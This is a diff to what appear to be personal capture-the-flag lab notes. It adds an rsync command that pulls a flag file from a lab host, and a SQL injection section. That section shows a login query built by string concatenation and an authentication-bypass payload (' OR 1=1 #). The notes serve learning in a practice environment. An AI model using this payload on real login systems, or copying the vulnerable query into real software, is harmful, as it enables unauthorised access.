@@ -50,11 +50,20 @@ Rsync list shares
 `rsync --list-only {target_IP}::`
 
 Rsync copy file to local
-`rsync 10.129.228.37::public/flag.txt ./flag.txt
-
-`
+`rsync 10.129.228.37::public/flag.txt ./flag.txt`
 
 ## Starting Point Tier 1
 
 ### Appointment
+
+MySQL Injection Example Server query
+`$sql="SELECT * FROM users WHERE username='$username' AND password='$password'";`
+
+Injection Attack
+$username = admin
+$password = ' OR 1=1 #
+`$sql="SELECT * FROM users WHERE username='admin' AND password='' OR 1=1 #'";`
+
+### Sequel
+
 
